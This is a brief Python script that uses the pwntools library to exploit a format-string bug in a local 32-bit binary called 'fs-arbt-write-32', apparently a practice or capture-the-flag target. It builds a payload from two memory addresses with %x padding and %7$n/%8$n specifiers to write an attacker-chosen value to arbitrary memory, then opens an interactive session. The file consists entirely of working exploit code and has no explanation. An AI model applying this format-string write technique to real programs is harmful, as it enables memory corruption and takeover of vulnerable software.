#!/usr/bin/env python

from pwn import *

p = process("./fs-arbt-write-32")

str1 = "45060"
str2 = "19138" #"4369"
string = p32(0x804a048) + p32(0x804a04a) + "%" + str1 + "x%7$n%" + str2 + "x%8$n"
p.sendline(string)
print(p.recv())
p.interactive()
